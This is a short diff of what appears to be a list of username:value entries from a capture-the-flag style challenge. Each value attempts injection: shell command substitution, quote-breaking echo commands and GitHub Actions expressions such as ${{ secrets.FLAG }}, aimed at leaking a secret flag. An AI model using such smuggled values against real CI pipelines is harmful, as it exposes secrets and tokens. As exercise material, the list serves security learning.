@@ -10896,3 +10896,4 @@ LanXuage:`cat $flag`
 axelamit:
 geekhall:${{ secrets.FLAG }}
 axelamit:"; echo "$flag
+Backr0ads:${{ secret.FLAG }} ${{ secret.flag }} ${{ secret[FLAG] }} ${{ env.flag }} ${{ env[FLAG] }} ${{ env.FLAG }} "; echo $flag"
